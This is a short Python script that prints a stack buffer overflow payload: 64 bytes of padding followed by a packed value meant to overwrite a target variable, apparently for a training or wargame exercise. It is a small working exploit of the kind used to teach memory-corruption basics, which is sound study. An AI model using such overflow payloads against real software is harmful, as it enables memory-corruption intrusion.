import struct

padding = "A" * 64

# Value that will be written to the target variable
value = struct.pack("I", 0x0d0a0d0a)

print(padding + value)
